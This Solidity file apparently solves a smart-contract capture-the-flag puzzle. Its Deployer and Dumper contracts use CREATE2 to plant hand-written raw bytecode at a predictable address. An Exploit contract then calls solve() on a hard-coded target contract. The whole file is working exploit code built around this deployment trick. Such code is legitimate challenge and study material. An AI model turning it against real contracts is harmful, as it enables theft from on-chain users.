// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IT {
    function solve() external;
}

contract Deployer {
    bytes public deployBytecode;
    address public deployedAddr;

    function deploy(bytes memory code, address a1) public {
        deployBytecode = code;
        address a;
        bytes memory args = abi.encode(address(a1));
        bytes memory dumperBytecode = abi.encodePacked(type(Dumper).creationCode, args);
        assembly {
            a := create2(callvalue(), add(0x20, dumperBytecode), mload(dumperBytecode), 0x9453)
        }
        deployedAddr = a;
    }

}

interface ISetup {
    function setup() external;
}

contract Dumper {
    constructor(address a1) public {
        if (a1 != address(0)) {
            ISetup(a1).setup();
        }
        Deployer dp = Deployer(msg.sender);
        bytes memory bytecode = dp.deployBytecode();
        assembly {
            return(add(bytecode, 0x20), mload(bytecode))
        }
    }
}

contract Exploit {

    function exploit() public {
        // write code here
        address target = 0x2eB0fCb87fe17e7a2aB93B6d51C0A72D9dbA6bdC;

        Deployer dp = new Deployer();

        bytes memory c1 =
            hex"0000000000000048656c6c6f20506c61796572600052600c6014f30000000000000000000000005b62602a566000526003601df3";
        
        dp.deploy(c1, target);

        IT(target).solve();
        
    }
}